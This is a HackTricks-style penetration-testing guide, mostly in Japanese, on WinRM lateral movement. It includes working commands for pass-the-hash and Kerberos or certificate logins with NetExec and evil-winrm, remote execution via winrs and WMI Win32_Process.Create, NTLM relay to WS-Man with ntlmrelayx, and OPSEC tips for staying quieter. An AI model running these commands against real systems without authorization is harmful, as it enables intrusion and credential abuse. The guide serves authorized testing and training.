# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM は、Windows 環境における最も便利な **lateral movement** 用トランスポートの 1 つです。**WS-Man/HTTP(S)** 経由でリモートシェルを取得でき、SMB のサービス作成トリックも不要です。対象が **5985/5986** を公開していて、あなたの principal に remoting の利用が許可されていれば、「valid creds」から「interactive shell」へ非常に দ্রুতに移れます。

**protocol/service enumeration**、listeners、WinRM の有効化、`Invoke-Command`、一般的なクライアントの使い方については、以下を参照してください。

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- **HTTP/HTTPS** を使うため、SMB/RPC よりも動作する場面が多く、PsExec 系の実行がブロックされる環境でも通ることがあります。
- **Kerberos** を使うと、再利用可能な認証情報を対象に送信せずに済みます。
- **Windows**、**Linux**、および **Python** ツール (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) からきれいに使えます。
- インタラクティブな PowerShell remoting パスでは、認証されたユーザーコンテキストで対象上に **`wsmprovhost.exe`** が起動し、service-based exec とは運用上異なります。

## Access model and prerequisites

実際には、WinRM による lateral movement の成功は **3 つ** に依存します。

1. 対象に **WinRM listener** (`5985`/`5986`) と、アクセスを許可する firewall rules があること。
2. アカウントがその endpoint に **authenticate** できること。
3. アカウントに remoting session を **open** する権限があること。

このアクセスを得る一般的な方法:

- 対象上の **Local Administrator**。
- 新しいシステムでは **Remote Management Users**、またはそのグループを今でも尊重するシステム/コンポーネントでは **WinRMRemoteWMIUsers__** への membership。
- local security descriptors / PowerShell remoting ACL の変更を通じて委任された明示的な remoting 権限。

すでに admin 権限で box を制御しているなら、ここで説明する技術を使って **完全な admin group membership なしで WinRM access を delegate** できることも覚えておいてください。

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos には hostname/FQDN が必要** です。IP で接続すると、client は通常 **NTLM/Negotiate** にフォールバックします。
- **workgroup** や cross-trust の境界ケースでは、NTLM には通常 **HTTPS** か、client 側で target を **TrustedHosts** に追加する必要があります。
- workgroup で **local accounts** を Negotiate 経由で使う場合、組み込み Administrator アカウントを使うか `LocalAccountTokenFilterPolicy=1` にしない限り、UAC remote restrictions によりアクセスできないことがあります。
- PowerShell remoting は既定で **`HTTP/<host>` SPN** を使います。`HTTP/<host>` がすでに別の service account に登録されている環境では、WinRM Kerberos は `0x80090322` で失敗することがあります。その場合は port-qualified SPN を使うか、該当 SPN がある **`WSMAN/<host>`** に切り替えてください。

password spraying で valid credentials を得たら、それが shell につながるかを確認する最速の方法として、WinRM 経由で検証するのがよく使われます。

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM for interactive shells

`evil-winrm` は、**passwords**、**NT hashes**、**Kerberos tickets**、**client certificates**、ファイル転送、メモリ内での PowerShell/.NET ロードをサポートしているため、Linux からの最も便利な interactive オプションのままです。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

デフォルトの **`HTTP/<host>`** SPN が Kerberos の失敗を引き起こす場合は、代わりに **`WSMAN/<host>`** チケットの要求/使用を試してください。これは、`HTTP/<host>` がすでに別の service account に関連付けられている、hardening された環境や特殊な enterprise setup で見られます。
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
これは、特に汎用の `HTTP` ticket ではなく **WSMAN** service ticket を偽造または要求した **RBCD / S4U** abuse の後にも有用です。

### Certificate-based authentication

WinRM は **client certificate authentication** もサポートしますが、certificate は target 上で **local account** に map されている必要があります。攻撃者視点では、これは次のような場合に重要です:

- WinRM 用にすでに map されている有効な client certificate と private key を盗み/export した場合;
- **AD CS / Pass-the-Certificate** を abuse して principal 用の certificate を取得し、その後別の authentication path へ pivot する場合;
- password-based remoting を意図的に避けている環境で操作している場合。
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM は password/hash/Kerberos auth よりもかなり一般的ではありませんが、存在する場合は password rotation を生き残る **passwordless lateral movement** の経路を提供できます。

### Python / automation with `pypsrp`

operator shell ではなく automation が必要な場合、`pypsrp` は Python から **NTLM**、**certificate auth**、**Kerberos**、**CredSSP** サポート付きで WinRM/PSRP を利用できます。
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windowsネイティブ WinRM lateral movement

### `winrs.exe`

`winrs.exe` は組み込みで、対話的な PowerShell remoting session を開かずに **native WinRM command execution** を行いたいときに便利です:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
運用上、`winrs.exe` は一般的に次のようなリモートプロセスチェーンになります:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
これは覚えておく価値があります。なぜなら、service-based exec や interactive PSRP sessions とは異なるからです。

### `winrm.cmd` / PowerShell remoting ではなく WS-Man COM

`Enter-PSSession` を使わずに、WS-Man 経由で WMI classes を呼び出すことで **WinRM transport** を通して実行することもできます。これにより transport は WinRM のままですが、remote execution primitive は **WMI `Win32_Process.Create`** になります:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
そのアプローチは、次のような場合に有用です:

- PowerShell logging が強く監視されている。
- 従来の PS remoting workflow ではなく、**WinRM transport** を使いたい。
- **`WSMan.Automation`** COM object を中心にした custom tooling を作成または使用している。

## NTLM relay to WinRM (WS-Man)

SMB relay が signing によってブロックされ、LDAP relay に制約がある場合でも、**WS-Man/WinRM** は依然として魅力的な relay target になり得ます。最新の `ntlmrelayx.py` には **WinRM relay servers** が含まれており、**`wsman://`** または **`winrms://`** targets に relay できます。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Two practical notes:

- Relay is most useful when the target accepts **NTLM** and the relayed principal is allowed to use WinRM.
- Recent Impacket code specifically handles **`WSMANIDENTIFY: unauthenticated`** requests so `Test-WSMan`-style probes do not break the relay flow.

For multi-hop constraints after landing a first WinRM session, check:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC and detection notes

- **Interactive PowerShell remoting** usually creates **`wsmprovhost.exe`** on the target.
- **`winrs.exe`** commonly creates **`winrshost.exe`** and then the requested child process.
- Expect **network logon** telemetry, WinRM service events, and PowerShell operational/script-block logging if you use PSRP rather than raw `cmd.exe`.
- If you only need a single command, `winrs.exe` or one-shot WinRM execution may be quieter than a long-lived interactive remoting session.
- If Kerberos is available, prefer **FQDN + Kerberos** over IP + NTLM to reduce both trust issues and awkward client-side `TrustedHosts` changes.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
